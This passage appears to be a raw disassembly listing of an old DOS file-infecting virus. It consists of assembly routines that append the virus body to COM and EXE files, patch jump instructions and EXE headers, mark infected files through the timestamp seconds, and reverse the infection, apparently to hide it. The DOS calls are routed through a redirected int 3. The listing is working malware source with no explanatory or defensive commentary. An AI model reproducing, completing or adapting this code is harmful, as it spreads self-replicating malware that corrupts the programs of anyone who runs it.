;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_16		proc	near
		push	ax
		mov	ax,5700h
		int	3			; Debug breakpoint
		mov	word ptr ds:[93Fh][si],cx
		mov	word ptr ds:[941h][si],dx
		and	cx,1Fh
		cmp	cx,1Fh
		pop	ax
		retn
sub_16		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_17		proc	near
		call	sub_14
		mov	ah,40h			; '@'
		mov	dx,si
		mov	cx,923h
		int	3			; Debug breakpoint
		retn
sub_17		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_18		proc	near
		call	sub_14
		add	ax,1FFh
		adc	dx,0
		mov	al,ah
		mov	ah,dl
		shr	ax,1			; Shift w/zeros fill
		mov	word ptr ds:[91Eh][si],ax
		mov	dx,4
		call	sub_13
		mov	ah,40h			; '@'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,2
		int	3			; Debug breakpoint
		retn
sub_18		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_19		proc	near
		push	es
		push	bx
		xor	bx,bx			; Zero register
		mov	ds,bx
		les	bx,dword ptr ds:data_6e	; Load 32 bit ptr
		mov	word ptr cs:[937h][si],bx
		mov	word ptr cs:[939h][si],es
		lea	bx,[si+41Dh]		; Load effective addr
		mov	ds:data_6e,bx
		mov	word ptr ds:data_6e+2,cs
		push	ds
		push	cs
		push	cs
		pop	ds
		pop	es
		push	ax
		cld				; Clear direction
		lea	dx,[si+970h]		; Load effective addr
		mov	di,dx
		add	al,61h			; 'a'
		mov	ah,3Ah			; ':'
		stosw				; Store ax to es:[di]
		mov	word ptr [di],5Ch
		mov	ah,5Ah			; 'Z'
		xor	cx,cx			; Zero register
		int	3			; Debug breakpoint
		jc	loc_59			; Jump if carry Set
		mov	bx,ax
		mov	ah,3Eh			; '>'
		int	3			; Debug breakpoint
		jc	loc_59			; Jump if carry Set
		mov	ah,41h			; 'A'
		int	3			; Debug breakpoint
loc_59:
		pop	ax
		pop	ds
		les	bx,dword ptr cs:[937h][si]	; Load 32 bit ptr
		mov	ds:data_6e,bx
		mov	word ptr ds:data_6e+2,es
		push	cs
		pop	ds
		pop	bx
		pop	es
		retn
sub_19		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_20		proc	near
		push	cs
		push	cs
		pop	ds
		pop	es
		call	sub_15
		jc	loc_60			; Jump if carry Set
		jmp	loc_69
loc_60:
		call	sub_16
		jnz	loc_61			; Jump if not zero
		jmp	loc_69
loc_61:
		call	sub_19
		jnc	loc_62			; Jump if carry=0
		jmp	loc_69
loc_62:
		cmp	ah,1
		je	loc_65			; Jump if equal
		cmp	ah,2
		jne	loc_63			; Jump if not equal
		jmp	loc_67
loc_63:
		mov	ah,3Fh			; '?'
		lea	dx,[si+42h]		; Load effective addr
		nop				;*ASM fixup - displacement
		mov	cx,2
		int	3			; Debug breakpoint
		mov	ah,3Fh			; '?'
		lea	dx,[si+60h]		; Load effective addr
		nop				;*ASM fixup - displacement
		mov	cx,2
		int	3			; Debug breakpoint
		mov	dx,[si+60h]
		call	sub_13
		mov	ah,3Fh			; '?'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,5
		int	3			; Debug breakpoint
		call	sub_14
		cmp	ax,0F000h
		jbe	loc_64			; Jump if below or =
		jmp	loc_69
loc_64:
		mov	word ptr ds:[925h][si],ax
		mov	dx,6
		call	sub_13
		mov	ah,40h			; '@'
		lea	dx,[si+925h]		; Load effective addr
		mov	cx,2
		int	3			; Debug breakpoint
		mov	dx,[si+60h]
		call	sub_13
		mov	ah,40h			; '@'
		lea	dx,[si+919h]		; Load effective addr
		mov	cx,5
		int	3			; Debug breakpoint
		call	sub_17
		jmp	loc_68
loc_65:
		call	sub_14
		cmp	ax,0F000h
		jbe	loc_66			; Jump if below or =
		jmp	loc_69
loc_66:
		add	ax,123h
		mov	word ptr ds:[925h][si],ax
		xor	dx,dx			; Zero register
		call	sub_13
		mov	byte ptr ds:[924h][si],0E9h
		mov	ah,40h			; '@'
		lea	dx,[si+924h]		; Load effective addr
		mov	cx,3
		int	3			; Debug breakpoint
		call	sub_17
		jmp	short loc_68
loc_67:
		mov	dx,4
		call	sub_13
		mov	ah,3Fh			; '?'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,6
		int	3			; Debug breakpoint
		call	sub_14
		add	ax,1FFh
		adc	dx,0
		shr	dx,1			; Shift w/zeros fill
		rcr	ax,1			; Rotate thru carry
		mov	al,ah
		mov	ah,dl
		cmp	ax,word ptr ds:[91Eh][si]
		jne	loc_69			; Jump if not equal
		mov	dx,14h
		call	sub_13
		mov	ah,3Fh			; '?'
		lea	dx,[si+122h]		; Load effective addr
		mov	cx,4
		int	3			; Debug breakpoint
		call	sub_14
		mov	di,word ptr ds:[922h][si]
		mov	cl,4
		shl	di,cl			; Shift w/zeros fill
		sub	ax,di
		sbb	dx,0
		add	ax,0FEh
		adc	dx,0
		mov	cl,0Ch
		shl	dx,cl			; Shift w/zeros fill
		mov	word ptr ds:[91Eh][si],ax
		mov	word ptr ds:[920h][si],dx
		mov	dx,14h
		call	sub_13
		mov	ah,40h			; '@'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,4
		int	3			; Debug breakpoint
		call	sub_17
		call	sub_18
loc_68:
		mov	ax,5701h
		mov	cx,word ptr ds:[93Fh][si]
		mov	dx,word ptr ds:[941h][si]
		or	cx,1Fh
		int	3			; Debug breakpoint
loc_69:
		xor	dx,dx			; Zero register
		call	sub_13
		retn
sub_20		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_21		proc	near
		push	cs
		push	cs
		pop	ds
		pop	es
		call	sub_15
		jc	loc_70			; Jump if carry Set
		jmp	loc_79
loc_70:
		call	sub_16
		jz	loc_71			; Jump if zero
		jmp	loc_79
loc_71:
		call	sub_19
		jnc	loc_72			; Jump if carry=0
		jmp	loc_79
loc_72:
		cmp	ah,1
		je	loc_74			; Jump if equal
		cmp	ah,2
		jne	loc_73			; Jump if not equal
		jmp	loc_76
loc_73:
		mov	ah,3Fh			; '?'
		lea	dx,[si+42h]		; Load effective addr
		nop				;*ASM fixup - displacement
		mov	cx,2
		int	3			; Debug breakpoint
		mov	dx,[si+42h]
		add	dx,42h
		nop				;*ASM fixup - sign extn byte
		call	sub_13
		mov	ah,3Fh			; '?'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,2
		int	3			; Debug breakpoint
		mov	dx,6
		call	sub_13
		mov	ah,40h			; '@'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,2
		int	3			; Debug breakpoint
		mov	dx,[si+42h]
		add	dx,91Eh
		call	sub_13
		mov	ah,3Fh			; '?'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,5
		int	3			; Debug breakpoint
		mov	dx,8
		call	sub_13
		mov	ah,3Fh			; '?'
		lea	dx,[si+60h]		; Load effective addr
		nop				;*ASM fixup - displacement
		mov	cx,2
		int	3			; Debug breakpoint
		mov	dx,[si+60h]
		call	sub_13
		mov	ah,40h			; '@'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,5
		int	3			; Debug breakpoint
		mov	dx,[si+42h]
		call	sub_13
		mov	ah,40h			; '@'
		xor	cx,cx			; Zero register
		int	3			; Debug breakpoint
		jmp	loc_78
loc_74:
		cmp	byte ptr ds:[91Eh][si],0E9h
		je	loc_75			; Jump if equal
		jmp	loc_79
loc_75:
		sub	word ptr ds:[91Fh][si],123h
		mov	dx,word ptr ds:[91Fh][si]
		add	dx,91Eh
		call	sub_13
		mov	ah,3Fh			; '?'
		lea	dx,[si+924h]		; Load effective addr
		mov	cx,3
		int	3			; Debug breakpoint
		xor	dx,dx			; Zero register
		call	sub_13
		mov	ah,40h			; '@'
		lea	dx,[si+924h]		; Load effective addr
		mov	cx,3
		int	3			; Debug breakpoint
		mov	dx,word ptr ds:[91Fh][si]
		call	sub_13
		mov	ah,40h			; '@'
		xor	cx,cx			; Zero register
		int	3			; Debug breakpoint
		jmp	short loc_78
loc_76:
		mov	dx,8
		call	sub_13
		mov	ah,3Fh			; '?'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,2
		int	3			; Debug breakpoint
		mov	dx,14h
		call	sub_13
		mov	ah,3Fh			; '?'
		lea	dx,[si+122h]		; Load effective addr
		mov	cx,4
		int	3			; Debug breakpoint
		mov	cl,0Ch
		shr	word ptr ds:[124h][si],cl	; Shift w/zeros fill
		mov	ax,word ptr ds:[91Eh][si]
		mov	cl,4
		shl	ax,cl			; Shift w/zeros fill
		sub	ax,0FEh
		cwd				; Word to double word
		add	word ptr ds:[122h][si],ax
		adc	word ptr ds:[124h][si],dx
		mov	ax,4200h
		mov	dx,word ptr ds:[122h][si]
		mov	cx,word ptr ds:[124h][si]
		add	dx,122h
		adc	cx,0
		int	3			; Debug breakpoint
		mov	ah,3Fh			; '?'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,4
		int	3			; Debug breakpoint
		mov	dx,14h
		call	sub_13
		mov	ah,40h			; '@'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,4
		int	3			; Debug breakpoint
		mov	ax,4200h
		mov	dx,word ptr ds:[122h][si]
		mov	cx,word ptr ds:[124h][si]
		int	3			; Debug breakpoint
		mov	ah,40h			; '@'
		xor	cx,cx			; Zero register
		int	3			; Debug breakpoint
		call	sub_18
loc_78:
		mov	ax,5701h
		mov	cx,word ptr ds:[93Fh][si]
		mov	dx,word ptr ds:[941h][si]
		and	cx,0FFE0h
		int	3			; Debug breakpoint
loc_79:
		xor	dx,dx			; Zero register
		call	sub_13
		retn
sub_21		endp

		db	 26h, 11h,0EAh, 4Ah, 00h, 00h
		db	 70h,0B0h,0F3h,0E6h, 60h,0B9h
		db	 1Ah, 1Ah
		db	716 dup (1Ah)

seg_a		ends



		end	start
